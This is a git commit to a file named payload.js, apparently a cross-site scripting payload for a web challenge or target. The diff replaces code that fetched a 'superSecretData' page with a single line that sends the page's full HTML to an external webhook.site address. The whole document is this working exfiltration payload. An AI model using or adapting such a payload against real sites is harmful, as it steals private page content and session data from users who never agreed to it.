cbc4c5fdf131f4151ca172ee39963222b54f2990
rishaldwivedi <rishal.dwivedi@gmail.com>
2025-06-25 04:59:55 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,7 +1,1 @@
-fetch("/app/superSecretData.html", {
-  method: "POST"
-})
-  .then(res => res.text())
-  .then(data => {
-    document.body.innerHTML += "<pre>" + data + "</pre>";
-  });
+fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?dump=" + encodeURIComponent(document.documentElement.innerHTML));
